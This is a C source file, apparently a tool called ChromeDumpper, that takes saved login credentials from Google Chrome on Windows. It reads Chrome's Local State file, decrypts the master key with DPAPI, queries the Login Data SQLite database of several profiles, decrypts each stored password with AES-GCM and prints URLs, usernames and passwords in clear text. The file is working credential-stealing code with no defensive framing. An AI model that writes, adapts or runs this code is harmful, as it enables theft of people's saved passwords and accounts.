// ConsoleApplication1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

// sqlite column names: Select action_url, username_value, password_value from Logins;
// %USERPROFILE%\appdata\local\google\chrome\user data\PROFILE\Login Data


#include <stdio.h>
#include <Lmcons.h>
#include<Windows.h>
#include "aes-gcm.h"

#include "cJSON.h"
#include <stdint.h>
#include <stdlib.h>
#include<dpapi.h>
#include <windows.h>
#include <Wincrypt.h>
#include "base64.h"
#include "sqlite3.h"
#include "ChromeDumpper.h"


#pragma comment(lib, "crypt32.lib")
#pragma warning(disable : 4996)
#define DPAPI_PREFIX_LEN 5

#define MAX_LEN 1024


char CHROME_PROFILE_ENDS[][100] = { "\\appdata\\local\\google\\chrome\\user data\\Default\\Login Data ",
                                        "\\appdata\\local\\google\\chrome\\user data\\Profile 1\\Login Data ",
                                        "\\appdata\\local\\google\\chrome\\user data\\Profile 2\\Login Data ",
                                        "\\appdata\\local\\google\\chrome\\user data\\Profile 3\\Login Data " };

int PATH_COUNT = 4;
char CHROME_KEY_PATH_END[100] = "\\appdata\\local\\google\\chrome\\user data\\Local State";
char* USER_PROFILE;





char key[1000];
int key_len;

int dpapi_decrypt(unsigned char* encText, unsigned long encTextSize, char* decText)
{
    DATA_BLOB in;
    DATA_BLOB out;
    in.pbData = (BYTE*) encText;
    in.cbData = encTextSize;

    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
    {
        for (int i = 0; i < out.cbData; i++)
            decText[i] = out.pbData[i];
        decText[out.cbData] = '\0';
        key_len = out.cbData;

        return 1;
    }
    int err = GetLastError();
    printf("error: %d\n", err);

    return 0;
} 

int key_decrypt(unsigned char* keyBase64, int keySize, unsigned char* decKey)
{
    int *key_decoded_len = malloc(sizeof(int));
    unsigned char* key_decoded = base64_decode(keyBase64, keySize, key_decoded_len);
    
    if (dpapi_decrypt(key_decoded + DPAPI_PREFIX_LEN, (*key_decoded_len - DPAPI_PREFIX_LEN), (decKey)))
    {
        // free(key_decoded_len);
        return 1;
    }
   free(key_decoded_len);

    return 0;
}



int bang_chrome(void) {
    gcm_initialize();

    USER_PROFILE = getenv("USERPROFILE");

    // key decrypt
    int retVal = ChromeKeyDecrypt();
    if (retVal == 1) return retVal;


    for (int index = 0; index < PATH_COUNT; index++) {
        ChromeDecryptProfile(CHROME_PROFILE_ENDS[index]);
    }

    return 0;
}

int ChromeDecryptProfile(char* profile)
{
    char db_path[1000];

    // constrcut pathes
    strcpy(db_path, USER_PROFILE);
    strcat(db_path, profile);




    //read db to decrypt
    sqlite3* db;
    char* err_msg = 0;

    int rc = sqlite3_open(db_path, &db);

    if (rc != SQLITE_OK) {
        fprintf(stderr, "%s. path:%s\n",
            sqlite3_errmsg(db), profile);
        sqlite3_close(db);
        return 1;
    }

    char sql[] = "SELECT origin_url, action_url, username_value, password_value FROM logins";

    rc = sqlite3_exec(db, sql, callback, 0, &err_msg);

    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to select data\n");
        fprintf(stderr, "SQL error: %s\n", err_msg);

        sqlite3_free(err_msg);
        sqlite3_close(db);

        return 1;
    }

    sqlite3_close(db);

    return 1;
}

int ChromeKeyDecrypt()
{

    char key_path[1000];
    strcpy(key_path, USER_PROFILE);
    strcat(key_path, CHROME_KEY_PATH_END);

    // read key file
    long int fsize = get_file_size(key_path);
    FILE* file_pointer = fopen(key_path, "r");
    char* json = (char*)malloc(fsize + 1);
    int len = fread(json, 1, fsize, file_pointer);
    fclose(file_pointer);

    // parse json string to get field
    cJSON* cjson = cJSON_Parse(json);
    if (cjson == NULL) {
        const char* error_ptr = cJSON_GetErrorPtr();
        if (error_ptr != NULL) {
            printf("Error: %s\n", error_ptr);
        }
        cJSON_Delete(cjson);
        return 1;
    }

    // access the JSON data and extract key
    cJSON* os_crypt = cJSON_GetObjectItem(cjson, "os_crypt");
    if (os_crypt) {
        cJSON* item = os_crypt->child;
        while (item) {
            // get and print key
            if (strcmp(item->string, "encrypted_key") == 0)
            {
                int encoded_key_len = strlen(item->valuestring);
                // base64 decode key
                key_decrypt(item->valuestring, encoded_key_len, key);
                break;
            }
            item = item->next;

        }
    }
    else {
        printf("Key decrypt failed.\n");
        return 1;
    }

    // free json related pointers
    cJSON_Delete(cjson);
    free(json);
    free(file_pointer);

    return 0;
}

int callback(void* NotUsed, int argc, char** argv,
    char** azColName) {

    NotUsed = 0;


    for (int i = 0; i < argc; i++) {
        if (i == 3) {
            char* pass = decrypt_password(argv[i]);
            printf("%s = %s\n", azColName[i], pass);
            free(pass);
        } else 
            printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
    }

    printf("\n");

    return 0;
}


char* decrypt_password(char* enc_pass) {
    char* dec_password = calloc(MAX_LEN, sizeof(char));

    if (strlen(enc_pass) < 32)
        return dec_password;
    char vec[13] = {0};
    
    char* pass = (char*) calloc(strlen(enc_pass)-1, sizeof(char));
    pass[strlen(enc_pass) - 2] = 0;
    int pass_len = (int) strlen(enc_pass) - 15 - 16;

    strncpy(vec, enc_pass + 3, 12);
    strncpy(pass, enc_pass + 15, pass_len);

    aes_gcm_decrypt(dec_password, pass,pass_len, key, key_len, vec, 12);
    
    free(pass);
    return dec_password;

}

long get_file_size(char* filename) {
    FILE* fp = fopen(filename, "r");

    if (fp == NULL)
        return -1;

    if (fseek(fp, 0, SEEK_END) < 0) {
        fclose(fp);
        return -1;
    }

    long size = ftell(fp);
    // release the resources when not required
    fclose(fp);
    return size;
}

